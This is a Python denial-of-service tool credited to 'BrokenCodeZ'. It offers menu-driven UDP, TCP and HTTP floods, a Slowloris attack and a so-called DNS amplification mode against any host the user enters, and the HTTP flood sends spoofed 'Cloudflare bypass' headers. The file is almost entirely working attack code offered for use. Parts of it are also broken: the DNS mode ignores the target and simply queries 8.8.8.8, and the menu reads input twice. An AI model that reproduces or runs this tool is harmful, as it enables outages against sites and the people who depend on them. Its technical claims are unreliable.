import os
import sys
import time
import socket
import threading
import requests
from concurrent.futures import ThreadPoolExecutor

# --- Configuration & Colors ---
BANNER = """
 _  __ _ _ _ 
 | |/ /(_) | | | ___  _ __ __ _
 | ' / | | | | |/ _ \| '__/ _` |
 | . \ | | | | | (_) | | | (_| |
 |_|\_\|_|_|_|_|\___/|_|  \__,_|

          DDoS Tool
      Made By BrokenCodeZ
"""

class Color:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    print(Color.GREEN + BANNER + Color.RESET)
    print(f"{Color.BOLD}{Color.YELLOW}--- DDoS Attack Tool v1.0 ---{Color.RESET}")
    print(f"{Color.BLUE}Select Method:{Color.RESET}")
    print("1. UDP Flood")
    print("2. TCP Flood")
    print("3. HTTP(S) Flood")
    print("4. Slowloris")
    print("5. DNS Amplification")
    print("6. Exit")
    return input(f"{Color.BOLD}Enter Choice [1-6]: {Color.RESET}")

def get_target_info():
    ip_or_host = input(f"{Color.BOLD}Enter IP or Hostname: {Color.RESET}")
    port = int(input(f"{Color.BOLD}Enter Port [Default 80]: {Color.RESET}") or "80")
    threads = int(input(f"{Color.BOLD}Enter Max Threads/Flood Rate [Max 1,000,000,000]: {Color.RESET}") or "1000")
    return ip_or_host, port, threads

def resolve_ip(host):
    try:
        return socket.gethostbyname(host)
    except socket.gaierror:
        return host

def udp_flood(ip, port, threads):
    print(f"{Color.GREEN}[BrokenCodeZ] Starting UDP Flood on {ip}:{port}...{Color.RESET}")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAA" # Random garbage data
    
    def send_udp():
        while True:
            try:
                sock.sendto(payload, (ip, port))
            except Exception as e:
                pass

    start_threads(threads, send_udp)

def tcp_flood(ip, port, threads):
    print(f"{Color.GREEN}[BrokenCodeZ] Starting TCP Flood on {ip}:{port}...{Color.RESET}")
    
    def send_tcp():
        while True:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((ip, port))
                sock.send(b"\x00\x00") # Keep connection alive briefly
                sock.close()
            except:
                pass

    start_threads(threads, send_tcp)

def http_flood(ip, port, threads):
    print(f"{Color.GREEN}[BrokenCodeZ] Starting HTTP Flood on {ip}:{port}...{Color.RESET}")
    
    def send_http():
        while True:
            try:
                # Cloudflare Bypass Headers
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive',
                    'Cache-Control': 'max-age=0',
                    'Upgrade-Insecure-Requests': '1',
                    'CF-Connecting-IP': '1.1.1.1', # Spoofing CF header
                    'X-Forwarded-For': '1.1.1.1'
                }
                url = f"http://{ip}:{port}/"
                requests.get(url, headers=headers, timeout=10)
            except:
                pass

    start_threads(threads, send_http)

def slowloris_flood(ip, port, threads):
    print(f"{Color.GREEN}[BrokenCodeZ] Starting Slowloris Attack...{Color.RESET}")
    sockets = []
    
    def keep_alive():
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, port))
                s.send(b"GET / HTTP/1.1\r\nHost: " + ip.encode() + b"\r\n")
                sockets.append(s)
                time.sleep(15) # Keep connection open
            except:
                pass

    def monitor_sockets():
        while True:
            for s in sockets[:]:
                try:
                    s.send(b"A") # Send a byte to keep it alive
                except:
                    sockets.remove(s)
                    try: s.close()
                    except: pass
            time.sleep(1)

    t1 = threading.Thread(target=keep_alive)
    t2 = threading.Thread(target=monitor_sockets)
    t1.daemon = True
    t2.daemon = True
    t1.start()
    t2.start()
    input(f"{Color.YELLOW}Press Enter to stop Slowloris...{Color.RESET}")

def dns_flood(ip, port, threads):
    print(f"{Color.GREEN}[BrokenCodeZ] Starting DNS Amplification...{Color.RESET}")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    def send_dns():
        while True:
            try:
                # Simple DNS query packet
                packet = b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                sock.sendto(packet, ('8.8.8.8', 53)) # Using Google DNS as source
            except:
                pass

    start_threads(threads, send_dns)

def start_threads(count, func):
    executor = ThreadPoolExecutor(max_workers=count)
    futures = [executor.submit(func) for _ in range(count)]
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{Color.RED}[BrokenCodeZ] Stopping attack...{Color.RESET}")
        executor.shutdown(wait=False)

def main():
    while True:
        clear_screen()
        print_banner()
        choice = input()
        
        if choice == '1':
            ip, port, threads = get_target_info()
            real_ip = resolve_ip(ip)
            udp_flood(real_ip, port, threads)
        elif choice == '2':
            ip, port, threads = get_target_info()
            real_ip = resolve_ip(ip)
            tcp_flood(real_ip, port, threads)
        elif choice == '3':
            ip, port, threads = get_target_info()
            http_flood(ip, port, threads)
        elif choice == '4':
            ip, port, threads = get_target_info()
            slowloris_flood(ip, port, threads)
        elif choice == '5':
            ip, port, threads = get_target_info()
            dns_flood(ip, port, threads)
        elif choice == '6':
            print(f"{Color.GREEN}[BrokenCodeZ] Exiting Tool...{Color.RESET}")
            break
        else:
            print(f"{Color.RED}Invalid Choice!{Color.RESET}")
            time.sleep(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Color.RED}[BrokenCodeZ] Force Exited.{Color.RESET}")